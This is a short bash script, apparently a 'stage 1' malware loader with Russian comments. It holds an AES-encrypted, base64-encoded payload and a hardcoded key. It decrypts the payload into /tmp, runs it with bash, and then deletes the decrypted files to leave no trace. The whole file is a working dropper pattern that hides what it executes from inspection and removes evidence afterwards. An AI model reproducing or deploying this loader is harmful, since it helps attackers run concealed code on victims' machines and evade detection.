#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="2fcc781df431f39956a4623232dcda24:DuOzOvW9WZVGuzBwiXkSvygmdU7h4FUffHUixMxyeuQDjApVk/UiurZobxvGiwelk3Ku3UiqLBVves+/YFeDo3PaZYS4/VjRPzxAovVJ4K+XYRdr/MhI9M62tv1STSt/2ipIjX4+1cUGkTg9PUSB8K/NyjYSrID2ORRxWWEnK/TYw4+pwJMA00aYTjvsCfzOey8ki55QBlEq+H7qlhn7GNOCLujgyV6gsYDlISK1ZZDr42A0jdDCdWEvry9clmtvgNhcyMOl1KetICNektcNKvTAhNsk5ILR16jdEoNAKknBthS9KWdq3PuyI+dNLVoPD5GPvKZCrcwAlYXAz7tBvnPm4wgABssmDePvpXyuTcf+f9D3tisZGfHLhOFIlhnklSbFV+26bzVOZd65pxZAFNlUpjz9H6BtWXJAYfT3At/rrroOZPC/hajZ6nxT7QLbsCo0lcMdEwne2S06QdcJmxCTDENvwPz6vjPxji2lWcA="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
